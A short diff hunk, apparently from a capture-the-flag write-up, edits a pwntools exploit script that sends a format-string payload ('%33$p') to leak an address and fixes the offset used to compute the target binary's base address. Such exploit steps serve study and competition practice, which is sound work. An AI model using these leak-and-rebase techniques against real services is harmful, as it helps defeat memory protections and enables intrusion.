@@ -28,7 +28,7 @@ payload2 = b"%33$p"
 r.sendafter(b"payload: ", payload2)
 r.recvuntil(b"submitted\n")
 leak_exe = int(r.recvuntil(b"1. Submit", drop=True), 16)
-exe.address = leak_exe - 0x42b
+exe.address = leak_exe - 0x42b - 0x2000
 log.info("leak exe " + hex(leak_exe))
 log.info("base exe " + hex(exe.address))
 ```
